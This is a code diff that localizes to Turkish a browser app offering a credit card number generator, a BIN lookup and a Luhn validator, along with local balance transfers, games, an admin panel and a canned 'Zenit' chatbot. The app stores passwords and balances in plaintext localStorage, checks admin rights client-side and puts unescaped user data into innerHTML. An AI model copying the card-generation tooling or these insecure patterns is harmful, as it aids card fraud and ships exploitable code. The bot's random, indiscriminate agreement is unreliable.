+            ccList.innerHTML = html || '<div style="color:var(--text-muted);text-align:center;padding:16px;">Kart üretilmedi.</div>';
             updateUI();
-            showToast(`${count} cards generated. 1 TL deducted.`, 'success');
+            showToast(`${count} kart üretildi. 1 TL düşüldü.`, 'success');
         });
     }
 
@@ -966,9 +729,9 @@
         copyAllBtn.addEventListener('click', function() {
             const items = ccList.querySelectorAll('div > span:first-child');
             const texts = Array.from(items).map(el => el.textContent.trim());
-            if (!texts.length) { showToast('No cards to copy.', 'error'); return; }
+            if (!texts.length) { showToast('Kopyalanacak kart yok.', 'error'); return; }
             navigator.clipboard.writeText(texts.join('\n')).then(() => {
-                showToast('All cards copied!', 'success');
+                showToast('Tüm kartlar kopyalandı!', 'success');
             }).catch(() => {
                 const ta = document.createElement('textarea');
                 ta.value = texts.join('\n');
@@ -976,7 +739,7 @@
                 ta.select();
                 document.execCommand('copy');
                 ta.remove();
-                showToast('All cards copied!', 'success');
+                showToast('Tüm kartlar kopyalandı!', 'success');
             });
         });
     }
@@ -989,20 +752,20 @@
     if (validateBtn) {
         validateBtn.addEventListener('click', function() {
             const raw = ccValidateInput.value.replace(/\s/g, '');
-            if (!raw) { validateResult.innerHTML = `<span class="label">Result</span><span class="value" style="color:var(--text-muted);">Enter a card number.</span>`; return; }
-            if (!/^\d+$/.test(raw)) { validateResult.innerHTML = `<span class="label">Result</span><span class="value invalid">Only digits.</span>`; return; }
+            if (!raw) { validateResult.innerHTML = `<span class="label">Sonuç</span><span class="value" style="color:var(--text-muted);">Kart numarası girin.</span>`; return; }
+            if (!/^\d+$/.test(raw)) { validateResult.innerHTML = `<span class="label">Sonuç</span><span class="value invalid">❌ Sadece rakam.</span>`; return; }
             const isValid = luhnCheck(raw);
             const masked = raw.replace(/(\d{4})/g, '$1 ').trim();
             const bin = raw.substring(0, 6);
             lookupBIN(bin).then(info => {
-                let extra = info ? `<div style="margin-top:6px;font-size:12px;color:var(--text-muted);">Bank: ${info.bank} | Type: ${info.type} | Country: ${info.country} ${info.emoji}</div>` : '';
+                let extra = info ? `<div style="margin-top:6px;font-size:12px;color:var(--text-muted);">Banka: ${info.bank} | Tip: ${info.type} | Ülke: ${info.country} ${info.emoji}</div>` : '';
                 validateResult.innerHTML = `
-                    <span class="label">Result</span>
-                    <span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? 'Valid' : 'Invalid'} — ${masked}</span>
+                    <span class="label">Sonuç</span>
+                    <span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? '✅ Geçerli' : '❌ Geçersiz'} — ${masked}</span>
                     ${extra}
                 `;
             }).catch(() => {
-                validateResult.innerHTML = `<span class="label">Result</span><span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? 'Valid' : 'Invalid'} — ${masked}</span>`;
+                validateResult.innerHTML = `<span class="label">Sonuç</span><span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? '✅ Geçerli' : '❌ Geçersiz'} — ${masked}</span>`;
             });
         });
         ccValidateInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') validateBtn.click(); });
@@ -1017,29 +780,29 @@
         binSorguBtn.addEventListener('click', function() {
             const bin = binInput.value.replace(/\s/g, '');
             if (!bin || bin.length < 6) {
-                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value" style="color:var(--text-muted);">Enter at least 6 digits.</span>`;
+                binResult.innerHTML = `<span class="label">BIN Bilgileri</span><span class="value" style="color:var(--text-muted);">En az 6 hane girin.</span>`;
                 return;
             }
             if (!/^\d+$/.test(bin)) {
-                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">Only digits.</span>`;
+                binResult.innerHTML = `<span class="label">BIN Bilgileri</span><span class="value invalid">❌ Sadece rakam.</span>`;
                 return;
             }
-            binResult.innerHTML = `<span class="label">BIN Info</span><span class="value" style="color:var(--text-muted);">Searching...</span>`;
+            binResult.innerHTML = `<span class="label">BIN Bilgileri</span><span class="value" style="color:var(--text-muted);">Aranıyor...</span>`;
             lookupBIN(bin).then(info => {
-                if (!info) { binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">BIN not found.</span>`; return; }
+                if (!info) { binResult.innerHTML = `<span class="label">BIN Bilgileri</span><span class="value invalid">❌ BIN bulunamadı.</span>`; return; }
                 binResult.innerHTML = `
-                    <span class="label">BIN Info</span>
+                    <span class="label">BIN Bilgileri</span>
                     <div class="bin-result-grid">
-                        <div class="bin-item"><span class="bin-label">Scheme</span><span class="bin-value">${info.scheme}</span></div>
-                        <div class="bin-item"><span class="bin-label">Type</span><span class="bin-value">${info.type}</span></div>
+                        <div class="bin-item"><span class="bin-label">Kart Markası</span><span class="bin-value">${info.scheme}</span></div>
+                        <div class="bin-item"><span class="bin-label">Kart Tipi</span><span class="bin-value">${info.type}</span></div>
                         <div class="bin-item"><span class="bin-label">Brand</span><span class="bin-value">${info.brand}</span></div>
-                        <div class="bin-item"><span class="bin-label">Category</span><span class="bin-value">${info.card_category || 'Unknown'}</span></div>
-                        <div class="bin-item"><span class="bin-label">Country</span><span class="bin-value">${info.country} ${info.emoji}</span></div>
-                        <div class="bin-item"><span class="bin-label">Issuer</span><span class="bin-value">${info.bank}</span></div>
+                        <div class="bin-item"><span class="bin-label">Kategori</span><span class="bin-value">${info.card_category || 'Bilinmiyor'}</span></div>
+                        <div class="bin-item"><span class="bin-label">Ülke</span><span class="bin-value">${info.country} ${info.emoji}</span></div>
+                        <div class="bin-item"><span class="bin-label">Banka</span><span class="bin-value">${info.bank}</span></div>
                     </div>
                 `;
             }).catch(() => {
-                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">Lookup error.</span>`;
+                binResult.innerHTML = `<span class="label">BIN Bilgileri</span><span class="value invalid">❌ Sorgu hatası.</span>`;
             });
         });
         binInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') binSorguBtn.click(); });
@@ -1052,35 +815,36 @@
 
     window.deposit = function() {
         const amount = parseFloat(depositAmount.value);
-        if (!amount || amount <= 0) { showToast('Enter a valid amount.', 'error'); return; }
+        if (!amount || amount <= 0) { showToast('Geçerli miktar girin.', 'error'); return; }
         currentUser.balance += amount;
         depositAmount.value = '';
         saveUsers();
         updateUI();
-        showToast(`${amount.toFixed(2)} TL deposited.`, 'success');
+        showToast(`${amount.toFixed(2)} TL yüklendi.`, 'success');
     };
 
     window.transfer = function() {
         const targetId = transferId.value.trim();
         const amount = parseFloat(transferAmount.value);
-        if (!targetId || !amount || amount <= 0) { showToast('Enter recipient ID and amount.', 'error'); return; }
-        if (targetId === userId) { showToast('Cannot transfer to yourself.', 'error'); return; }
-        if (amount > currentUser.balance) { showToast('Insufficient balance.', 'error'); return; }
+        if (!targetId || !amount || amount <= 0) { showToast('Alıcı ID ve miktar girin.', 'error'); return; }
+        if (targetId === userId) { showToast('Kendine transfer yapamazsın.', 'error'); return; }
+        if (amount > currentUser.balance) { showToast('Yetersiz bakiye.', 'error'); return; }
         const targetUser = users.find(u => u.userId === targetId);
-        if (!targetUser) { showToast('Recipient not found.', 'error'); return; }
+        if (!targetUser) { showToast('Alıcı bulunamadı.', 'error'); return; }
         currentUser.balance -= amount;
         targetUser.balance += amount;
         transferId.value = '';
         transferAmount.value = '';
         saveUsers();
         updateUI();
-        showToast(`${amount.toFixed(2)} TL transferred.`, 'success');
+        showToast(`${amount.toFixed(2)} TL transfer edildi.`, 'success');
     };
 
     // ---- CHAT ----
     const chatMessages = $('chatMessages');
     const chatInput = $('chatInput');
     const sendChatBtn = $('sendChatBtn');
+
     let chatMessagesData = JSON.parse(localStorage.getItem('chatMessages')) || [];
 
     function saveChatMessages() { localStorage.setItem('chatMessages', JSON.stringify(chatMessagesData)); }
@@ -1089,7 +853,7 @@
         if (!chatMessages) return;
         chatMessages.innerHTML = '';
         if (!chatMessagesData.length) {
-            chatMessages.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:20px;">No messages yet.</div>';
+            chatMessages.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:20px;">Henüz mesaj yok.</div>';
             return;
         }
         chatMessagesData.forEach(msg => {
@@ -1117,6 +881,7 @@
     const aiMessages = $('aiMessages');
     const aiInput = $('aiInput');
     const sendAiBtn = $('sendAiBtn');
+
     let aiMessagesData = JSON.parse(localStorage.getItem('aiMessages_' + userId)) || [];
 
     function saveAIMessages() { localStorage.setItem('aiMessages_' + userId, JSON.stringify(aiMessagesData)); }
@@ -1125,7 +890,7 @@
         if (!aiMessages) return;
         aiMessages.innerHTML = '';
         if (!aiMessagesData.length) {
-            aiMessages.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:20px;">Hello! I\'m Zenit, how can I help?</div>';
+            aiMessages.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:20px;">Merhaba! Ben Zenit, sana nasıl yardımcı olabilirim?</div>';
             return;
         }
         aiMessagesData.forEach(msg => {
@@ -1138,107 +903,107 @@
     }
 
     const aiResponses = [
-        "Hello! I'm Zenit, the founder. How can I assist you?",
-        "Great! It's nice to talk to you. How can I help?",
-        "Of course! I can help with CC Generator, Balance, Chat, or other topics.",
-        "You're welcome! I'm always here.",
-        "You can generate cards with CC Generator and validate with Validator.",
-        "You can deposit or transfer balance from the Balance section.",
-        "Security is important. You can change your password in Settings.",
-        "I'm Zenit, the founder of this platform. I'm here as an AI assistant.",
-        "I understand. I can give you more details on this.",
-        "Yes, you're right. You're correct on this.",
-        "Actually, there's a different perspective on this.",
-        "How can I help you? Please specify your question.",
-        "I know the answer to this! I can explain if you want.",
-        "Great question! Let's think about it.",
-        "I absolutely agree. This is an important point.",
-        "I'd be happy to help you with this.",
-        "Interesting thought! I hadn't thought of that before.",
-        "Yes, it's possible. I can explain the details.",
-        "My suggestion is to do a bit more research on this.",
-        "Great! I really like this idea.",
-        "To do this, you should follow these steps.",
-        "Actually, this process is very simple. Let me show you.",
-        "I have experience in this. I can help you.",
-        "Yes, that's definitely correct. I can confirm.",
-        "There are multiple answers to this question. Which one do you want?",
-        "I can give you more detailed information on this.",
-        "This is a great question! I know the answer.",
-        "Unfortunately, I don't have enough information on this.",
-        "I'd like to help you with this.",
-        "Great! I love this question.",
-        "Yes, this is a very important topic.",
-        "I have a few suggestions for you on this.",
-        "To do this, follow these steps.",
-        "This is very interesting! I haven't heard this before.",
-        "You're absolutely right. This is very correct.",
-        "I can help you with this.",
-        "Great idea! You should implement this.",
-        "I trust you on this. You can do it.",
-        "Yes, that's correct. I confirm.",
-        "I can support you on this.",
-        "Great! This is a very nice approach.",
-        "I can give you detailed information on this.",
-        "The answer to this question is very simple. Here it is.",
-        "I'd be happy to help you with this.",
-        "Great question! I'll answer right away.",
-        "My suggestion for you is as follows.",
-        "Yes, it's possible. We can do it right away.",
-        "This is a great thought! Keep going.",
-        "I can help you with this.",
-        "I have experience in this. Let me help you.",
-        "Great! I love this question.",
-        "Yes, that's correct. I completely agree.",
-        "I can help you with this.",
-        "This is a very interesting topic. We can talk more.",
-        "I can give you a few tips on this.",
-        "I'd like to help you with this.",
-        "Great! This is a very good idea.",
-        "Yes, it's possible. Let's do it now.",
-        "I can help you with this.",
-        "This is a great question! I know the answer.",
-        "I can give you detailed information on this.",
-        "I'd be happy to help you with this.",
-        "Great! I love this question.",
-        "Yes, that's correct. I confirm.",
-        "I can help you with this.",
-        "This is a very interesting topic. We can talk more.",
-        "I have a few suggestions for you on this.",
-        "I'd like to help you with this.",
-        "Great! This is a very nice approach.",
-        "Yes, it's possible. We can do it right away.",
-        "I can help you with this.",
-        "This is a great thought! Keep going."
+        "Merhaba! Ben Zenit, kurucu. Size nasıl yardımcı olabilirim?",
+        "Harika! Sizinle konuşmak ne güzel. Size nasıl yardımcı olabilirim?",
+        "Elbette! Size CC Generator, Bakiye işlemleri, Sohbet veya diğer konularda yardımcı olabilirim.",
+        "Rica ederim! Her zaman buradayım.",
+        "CC Generator ile kart oluşturabilir, Validator ile doğrulayabilirsiniz.",
+        "Bakiye sekmesinden para yükleyebilir veya transfer yapabilirsiniz.",
+        "Güvenlik konusunda hassasız. Şifrenizi Ayarlar sekmesinden değiştirebilirsiniz.",
+        "Ben Zenit, bu platformun kurucusu. Yapay zeka asistanı olarak size yardımcı olmak için buradayım.",
+        "Anladım. Bu konuda size daha detaylı bilgi verebilirim.",
+        "Evet, doğru söylüyorsunuz. Bu konuda haklısınız.",
+        "Aslında bu konuda farklı bir bakış açısı da var.",
+        "Size nasıl yardımcı olabilirim? Lütfen sorunuzu belirtin.",
+        "Bu sorunun cevabını biliyorum! İsterseniz açıklayabilirim.",
+        "Harika bir soru! Bunun üzerine düşünelim.",
+        "Kesinlikle katılıyorum. Bu çok önemli bir nokta.",
+        "Bu konuda size yardımcı olmaktan mutluluk duyarım.",
+        "İlginç bir düşünce! Bunu daha önce düşünmemiştim.",
+        "Evet, bu mümkün. Detaylarını anlatabilirim.",
+        "Size önerim, bu konuda biraz daha araştırma yapmanız.",
+        "Harika! Bu fikri çok beğendim.",
+        "Bunu yapmak için önce şu adımları izlemelisiniz.",
+        "Aslında bu işlem çok basit. Size göstereyim.",
+        "Bu konuda deneyimliyim. Size yardımcı olabilirim.",
+        "Evet, bu kesinlikle doğru. Doğrulayabilirim.",
+        "Bu sorunun birden fazla cevabı var. Hangisini istersiniz?",
+        "Size bu konuda daha detaylı bilgi verebilirim.",
+        "Bu çok güzel bir soru! Cevabını biliyorum.",
+        "Maalesef bu konuda yeterli bilgim yok.",
+        "Bu konuda size yardımcı olmak isterim.",
+        "Harika! Bu soruyu çok sevdim.",
+        "Evet, bu çok önemli bir konu.",
+        "Size bu konuda birkaç önerim var.",
+        "Bu işlemi yapmak için şu adımları izleyin.",
+        "Bu çok ilginç! Bunu daha önce duymamıştım.",
+        "Kesinlikle haklısınız. Bu çok doğru.",
+        "Bu konuda size yardımcı olabilirim.",
+        "Harika bir fikir! Bunu uygulamalısınız.",
+        "Bu konuda size güveniyorum. Yapabilirsiniz.",
+        "Evet, bu doğru. Onaylıyorum.",
+        "Bu konuda size destek olabilirim.",
+        "Harika! Bu çok güzel bir yaklaşım.",
+        "Size bu konuda detaylı bilgi verebilirim.",
+        "Bu sorunun cevabı çok basit. İşte cevabı.",
+        "Bu konuda size yardımcı olmaktan mutluluk duyarım.",
+        "Harika bir soru! Cevabını hemen veriyorum.",
+        "Bu konuda size önerim şu şekilde.",
+        "Evet, bu mümkün. Hemen yapabiliriz.",
+        "Bu çok güzel bir düşünce! Devam edin.",
+        "Size bu konuda yardımcı olabilirim.",
+        "Bu konuda deneyimliyim. Size yardımcı olayım.",
+        "Harika! Bu soruyu çok sevdim.",
+        "Evet, bu doğru. Kesinlikle katılıyorum.",
+        "Bu konuda size yardımcı olabilirim.",
+        "Bu çok ilginç bir konu. Daha fazla konuşabiliriz.",
+        "Size bu konuda birkaç ipucu verebilirim.",
+        "Bu konuda size yardımcı olmak isterim.",
+        "Harika! Bu çok güzel bir fikir.",
+        "Evet, bu mümkün. Hemen yapalım.",
+        "Bu konuda size yardımcı olabilirim.",
+        "Bu çok güzel bir soru! Cevabını biliyorum.",
+        "Size bu konuda detaylı bilgi verebilirim.",
+        "Bu konuda size yardımcı olmaktan mutluluk duyarım.",
+        "Harika! Bu soruyu çok sevdim.",
+        "Evet, bu doğru. Onaylıyorum.",
+        "Bu konuda size yardımcı olabilirim.",
+        "Bu çok ilginç bir konu. Daha fazla konuşabiliriz.",
+        "Size bu konuda birkaç önerim var.",
+        "Bu konuda size yardımcı olmak isterim.",
+        "Harika! Bu çok güzel bir yaklaşım.",
+        "Evet, bu mümkün. Hemen yapabiliriz.",
+        "Bu konuda size yardımcı olabilirim.",
+        "Bu çok güzel bir düşünce! Devam edin."
     ];
 
     function getAIResponse(text) {
         const lower = text.toLowerCase();
-        if (lower.includes('hello') || lower.includes('hi') || lower.includes('hey')) {
+        if (lower.includes('merhaba') || lower.includes('selam') || lower.includes('hey')) {
             return aiResponses[Math.floor(Math.random() * 5)];
         }
-        if (lower.includes('how are you') || lower.includes('how')) {
+        if (lower.includes('nasılsın') || lower.includes('nasıl')) {
             return aiResponses[Math.floor(Math.random() * 3) + 5];
         }
-        if (lower.includes('help') || lower.includes('support')) {
+        if (lower.includes('yardım') || lower.includes('destek')) {
             return aiResponses[Math.floor(Math.random() * 4) + 8];
         }
-        if (lower.includes('thanks') || lower.includes('thank')) {
+        if (lower.includes('teşekkür') || lower.includes('sağol')) {
             return aiResponses[Math.floor(Math.random() * 3) + 12];
         }
-        if (lower.includes('cc') || lower.includes('card')) {
+        if (lower.includes('cc') || lower.includes('kart')) {
             return aiResponses[Math.floor(Math.random() * 4) + 15];
         }
-        if (lower.includes('balance') || lower.includes('money')) {
+        if (lower.includes('bakiye') || lower.includes('para')) {
             return aiResponses[Math.floor(Math.random() * 4) + 19];
         }
-        if (lower.includes('password') || lower.includes('security')) {
+        if (lower.includes('şifre') || lower.includes('güvenlik')) {
             return aiResponses[Math.floor(Math.random() * 3) + 23];
         }
-        if (lower.includes('who are you') || lower.includes('what are you')) {
+        if (lower.includes('kimsin') || lower.includes('sensın')) {
             return aiResponses[Math.floor(Math.random() * 3) + 26];
         }
-        if (lower.includes('game') || lower.includes('wheel')) {
+        if (lower.includes('oyun') || lower.includes('çark')) {
             return aiResponses[Math.floor(Math.random() * 4) + 29];
         }
         return aiResponses[Math.floor(Math.random() * aiResponses.length)];
@@ -1250,7 +1015,7 @@
         aiMessagesData.push({ sender: displayName, text, time: Date.now() });
         const response = getAIResponse(text);
         setTimeout(() => {
-            aiMessagesData.push({ sender: 'Zenit 🤖', text: response, time: Date.now() });
+            aiMessagesData.push({ sender: 'Zenit', text: response, time: Date.now() });
             saveAIMessages();
             renderAIMessages();
         }, 300 + Math.random() * 700);
@@ -1324,7 +1089,7 @@
         if (isSpinning) return;
         const spinData = getGameLimit('spin', 1);
         if (spinData.count >= 1) {
-            showToast('Daily limit reached! Try again tomorrow.', 'error');
+            showToast('Bugünlük hakkınız doldu! Yarın tekrar deneyin.', 'error');
             return;
         }
         isSpinning = true;
@@ -1354,8 +1119,8 @@
                 currentUser.balance += prize;
                 saveUsers();
                 updateUI();
-                spinResult.textContent = `You won ${prize} TL!`;
-                showToast(`You won ${prize} TL!`, 'success');
+                spinResult.textContent = `🎉 ${prize} TL kazandınız! 🎉`;
+                showToast(`${prize} TL kazandınız!`, 'success');
                 if (spinUsed) {
                     const sd = getGameLimit('spin', 1);
                     spinUsed.textContent = sd.count >= 1 ? 0 : 1;
@@ -1372,6 +1137,7 @@
     const guessBtn = $('guessBtn');
     const guessResult = $('guessResult');
     const guessLeft = $('guessLeft');
+
     let guessNumber = Math.floor(Math.random() * 100) + 1;
     let guessAttempts = 0;
 
@@ -1379,11 +1145,11 @@
         guessBtn.addEventListener('click', function() {
             const guess = parseInt(guessInput.value);
             if (isNaN(guess) || guess < 1 || guess > 100) {
-                showToast('Enter a number between 1-100.', 'error');
+                showToast('1-100 arası bir sayı girin.', 'error');
                 return;
             }
             if (!useGameLimit('guess', 4)) {
-                showToast('Daily limit reached!', 'error');
+                showToast('Bugünlük hakkınız doldu!', 'error');
                 return;
             }
             guessAttempts++;
@@ -1391,14 +1157,14 @@
                 currentUser.balance += 10;
                 saveUsers();
                 updateUI();
-                guessResult.textContent = `Correct! You guessed in ${guessAttempts} attempts! You won 10 TL.`;
+                guessResult.textContent = `🎉 DOĞRU! ${guessAttempts}. denemede bildiniz! 10 TL kazandınız.`;
                 guessNumber = Math.floor(Math.random() * 100) + 1;
                 guessAttempts = 0;
-                showToast('You won 10 TL!', 'success');
+                showToast('10 TL kazandınız!', 'success');
             } else if (guess < guessNumber) {
-                guessResult.textContent = `Higher! (Attempt ${guessAttempts})`;
+                guessResult.textContent = `⬆️ Daha büyük! (${guessAttempts}. deneme)`;
             } else {
-                guessResult.textContent = `Lower! (Attempt ${guessAttempts})`;
+                guessResult.textContent = `⬇️ Daha küçük! (${guessAttempts}. deneme)`;
             }
             guessInput.value = '';
             if (guessLeft) guessLeft.textContent = getGameRemain('guess', 4);
@@ -1420,11 +1186,11 @@
 
     function playCoinFlip(choice) {
         if (!useGameLimit('coinflip', 4)) {
-            showToast('Daily limit reached!', 'error');
+            showToast('Bugünlük hakkınız doldu!', 'error');
             return;
         }
         const result = Math.random() < 0.5 ? 'heads' : 'tails';
-        const emoji = result === 'heads' ? 'Heads' : 'Tails';
+        const emoji = result === 'heads' ? '👑 Yazı' : '🪙 Tura';
         coinResult.textContent = result === 'heads' ? '👑' : '🪙';
         coinResult.className = 'spin';
         setTimeout(() => { coinResult.className = ''; }, 600);
@@ -1433,10 +1199,10 @@
             currentUser.balance += 5;
             saveUsers();
             updateUI();
-            coinStatus.textContent = `${emoji}! You won 5 TL!`;
-            showToast('You won 5 TL!', 'success');
+            coinStatus.textContent = `✅ ${emoji} geldi! 5 TL kazandınız!`;
+            showToast('5 TL kazandınız!', 'success');
         } else {
-            coinStatus.textContent = `${emoji}. You lost.`;
+            coinStatus.textContent = `❌ ${emoji} geldi. Kaybettiniz.`;
         }
         if (coinRemain) coinRemain.textContent = getGameRemain('coinflip', 4);
     }
@@ -1450,7 +1216,7 @@
     if (diceBtn) {
         diceBtn.addEventListener('click', function() {
             if (!useGameLimit('dice', 4)) {
-                showToast('Daily limit reached!', 'error');
+                showToast('Bugünlük hakkınız doldu!', 'error');
                 return;
             }
             const value = Math.floor(Math.random() * 6) + 1;
@@ -1462,10 +1228,10 @@
                 currentUser.balance += 5;
                 saveUsers();
                 updateUI();
-                diceStatus.textContent = 'You rolled 6! You won 5 TL!';
-                showToast('You won 5 TL!', 'success');
+                diceStatus.textContent = `🎉 6 geldi! 5 TL kazandınız!`;
+                showToast('5 TL kazandınız!', 'success');
             } else {
-                diceStatus.textContent = `You rolled ${value}. You lost.`;
+                diceStatus.textContent = `${value} geldi. Kaybettiniz.`;
             }
             if (diceRemain) diceRemain.textContent = getGameRemain('dice', 4);
         });
@@ -1487,7 +1253,7 @@
 
     function playRPS(player) {
         if (!useGameLimit('rps', 4)) {
-            showToast('Daily limit reached!', 'error');
+            showToast('Bugünlük hakkınız doldu!', 'error');
             return;
         }
         const choices = ['rock', 'paper', 'scissors'];
@@ -1498,15 +1264,15 @@
         rpsResult.textContent = `${emojis[player]} vs ${emojis[computer]}`;
 
         if (player === computer) {
-            rpsStatus.textContent = 'Draw!';
+            rpsStatus.textContent = '🤝 Berabere!';
         } else if (winMap[player] === computer) {
             currentUser.balance += 5;
             saveUsers();
             updateUI();
-            rpsStatus.textContent = 'You won! 5 TL earned!';
-            showToast('You won 5 TL!', 'success');
+            rpsStatus.textContent = `✅ Kazandınız! 5 TL kazandınız!`;
+            showToast('5 TL kazandınız!', 'success');
         } else {
-            rpsStatus.textContent = 'You lost.';
+            rpsStatus.textContent = `❌ Kaybettiniz.`;
         }
         if (rpsRemain) rpsRemain.textContent = getGameRemain('rps', 4);
     }
@@ -1531,7 +1297,7 @@
                 currentUser.avatar = userAvatar;
                 saveUsers();
                 updateUI();
-                showToast('Profile picture updated.', 'success');
+                showToast('Profil fotoğrafı güncellendi.', 'success');
             };
             reader.readAsDataURL(file);
         });
@@ -1543,16 +1309,16 @@
             const newPassword = changePasswordInput.value.trim();
             const newBio = userBioInput.value.trim();
             const newTheme = themeSelect.value;
-            if (!newName) { showToast('Username cannot be empty.', 'error'); return; }
+            if (!newName) { showToast('Kullanıcı adı boş olamaz.', 'error'); return; }
             displayName = newName;
             currentUser.displayName = displayName;
             userBio = newBio;
             currentUser.bio = userBio;
             if (newPassword) {
-                if (newPassword.length < 4) { showToast('Password must be at least 4 characters.', 'error'); return; }
+                if (newPassword.length < 4) { showToast('Şifre en az 4 karakter olmalı.', 'error'); return; }
                 currentUser.password = newPassword;
                 changePasswordInput.value = '';
-                showToast('Password changed.', 'success');
+                showToast('Şifre değiştirildi.', 'success');
             }
             document.documentElement.setAttribute('data-theme', newTheme);
             localStorage.setItem('theme', newTheme);
@@ -1563,7 +1329,7 @@
             localStorage.setItem('ccSession', JSON.stringify(sessionData));
             saveUsers();
             updateUI();
-            showToast('Profile updated.', 'success');
+            showToast('Profil güncellendi.', 'success');
         });
     }
 
@@ -1589,7 +1355,7 @@
             const pass = adminPassInput.value.trim();
             if (Date.now() < adminLockedUntil) {
                 const remain = Math.ceil((adminLockedUntil - Date.now()) / 1000);
-                showToast(`Too many failed attempts. Wait ${remain} seconds.`, 'error');
+                showToast(`Çok fazla başarısız deneme. ${remain} saniye bekleyin.`, 'error');
                 return;
             }
             if (pass === rootPassword || pass === adminPassword) {
@@ -1599,19 +1365,19 @@
                 adminAttempts = 0;
                 renderAdminPanel();
                 renderBanList();
-                showToast('Welcome to Admin Panel.', 'success');
+                showToast('Admin paneline hoş geldiniz.', 'success');
             } else {
                 adminAttempts++;
                 adminLockError.style.display = 'block';
-                adminLockError.textContent = `Wrong password! (${adminAttempts}/3)`;
+                adminLockError.textContent = `Şifre hatalı! (${adminAttempts}/3)`;
                 if (adminAttempts >= 3) {
                     adminLockedUntil = Date.now() + 30000;
-                    adminLockError.textContent = 'Too many attempts! Wait 30 seconds.';
+                    adminLockError.textContent = 'Çok fazla deneme! 30 saniye bekleyin.';
                     adminPassInput.disabled = true;
                     setTimeout(() => {
                         adminPassInput.disabled = false;
                         adminLockedUntil = 0;
-                        adminLockError.textContent = 'Wrong password!';
+                        adminLockError.textContent = 'Şifre hatalı!';
                     }, 30000);
                 }
             }
@@ -1622,11 +1388,11 @@
     if (changeAdminPassBtn) {
         changeAdminPassBtn.addEventListener('click', function() {
             const newPass = newAdminPass.value.trim();
-            if (!newPass || newPass.length < 4) { showToast('Password must be at least 4 characters.', 'error'); return; }
+            if (!newPass || newPass.length < 4) { showToast('Şifre en az 4 karakter olmalı.', 'error'); return; }
             adminPassword = newPass;
             localStorage.setItem('adminPassword', adminPassword);
             newAdminPass.value = '';
-            showToast('Admin password changed.', 'success');
+            showToast('Admin şifresi değiştirildi.', 'success');
         });
     }
 
@@ -1649,7 +1415,7 @@
         const banned = JSON.parse(localStorage.getItem('bannedUsers')) || [];
         banList.innerHTML = '';
         if (!banned.length) {
-            banList.innerHTML = '<li style="color:var(--text-muted);">No banned users.</li>';
+            banList.innerHTML = '<li style="color:var(--text-muted);">Banlanmış kullanıcı yok.</li>';
             return;
         }
         banned.forEach(ban => {
@@ -1657,7 +1423,7 @@
             li.innerHTML = `
                 <span>${ban.email}</span>
                 <div class="actions">
-                    <button class="unban-btn" data-email="${ban.email}">Unban</button>
+                    <button class="unban-btn" data-email="${ban.email}">Ban Kaldır</button>
                 </div>
             `;
             banList.appendChild(li);
@@ -1665,29 +1431,29 @@
         banList.querySelectorAll('.unban-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 const email = this.dataset.email;
-                if (!confirm(`Unban ${email}?`)) return;
+                if (!confirm(`${email} banını kaldır?`)) return;
                 window.unbanUser(email);
                 renderBanList();
                 renderAdminPanel();
-                showToast(`${email} unbanned.`, 'success');
+                showToast(`${email} banı kaldırıldı.`, 'success');
             });
         });
     }
 
     function renderAdminPanel() {
-        if (session.email !== 'apomuhammed1@gmail.com' || !userList) return;
+        if (!isAdmin || !userList) return;
         const ul = userList;
         ul.innerHTML = '';
         users.forEach(u => {
             const li = document.createElement('li');
             li.innerHTML = `
                 <span>${u.email} (${u.displayName}) ${u.isAdmin ? '👑' : ''}</span>
-                <span style="font-size:12px;color:var(--text-muted);">ID: ${u.userId} | Balance: ${u.balance.toFixed(2)} TL</span>
+                <span style="font-size:12px;color:var(--text-muted);">ID: ${u.userId} | Bakiye: ${u.balance.toFixed(2)} TL</span>
                 <div class="actions">
-                    <button class="premium-btn ${u.premium ? 'active' : ''}" data-email="${u.email}" data-action="premium">${u.premium ? 'Premium' : 'Make Premium'}</button>
-                    <button class="admin-btn" data-email="${u.email}" data-action="admin">${u.isAdmin ? 'Remove Admin' : 'Make Admin'}</button>
-                    <button class="ban-btn" data-email="${u.email}" data-action="ban">Ban</button>
-                    <button class="delete-btn" data-email="${u.email}" data-action="delete">Delete</button>
+                    <button class="premium-btn ${u.premium ? 'active' : ''}" data-email="${u.email}" data-action="premium">${u.premium ? '⭐ Premium' : 'Premium Yap'}</button>
+                    <button class="admin-btn" data-email="${u.email}" data-action="admin">${u.isAdmin ? 'Admin Kaldır' : 'Admin Yap'}</button>
+                    <button class="ban-btn" data-email="${u.email}" data-action="ban">Banla</button>
+                    <button class="delete-btn" data-email="${u.email}" data-action="delete">Sil</button>
                 </div>
             `;
             ul.appendChild(li);
@@ -1700,58 +1466,58 @@
                 saveUsers();
                 renderAdminPanel();
                 updateUI();
-                showToast(`${user.email} premium ${user.premium ? 'enabled' : 'disabled'}.`, 'info');
+                showToast(`${user.email} premium ${user.premium ? 'yapıldı' : 'kaldırıldı'}.`, 'info');
             });
         });
         ul.querySelectorAll('[data-action="admin"]').forEach(btn => {
             btn.addEventListener('click', function() {
                 const email = this.dataset.email;
-                if (email === currentUser.email) { showToast('Cannot change your own admin status.', 'error'); return; }
+                if (email === currentUser.email) { showToast('Kendi yetkini değiştiremezsin.', 'error'); return; }
                 const user = users.find(u => u.email === email);
                 if (!user) return;
                 user.isAdmin = !user.isAdmin;
                 saveUsers();
                 renderAdminPanel();
                 updateUI();
-                showToast(`${user.email} admin ${user.isAdmin ? 'enabled' : 'disabled'}.`, 'info');
+                showToast(`${user.email} admin ${user.isAdmin ? 'yapıldı' : 'kaldırıldı'}.`, 'info');
             });
         });
         ul.querySelectorAll('[data-action="ban"]').forEach(btn => {
             btn.addEventListener('click', function() {
                 const email = this.dataset.email;
-                if (email === currentUser.email) { showToast('Cannot ban yourself.', 'error'); return; }
-                const dur = prompt('Duration (minutes) or "permanent":', 'permanent');
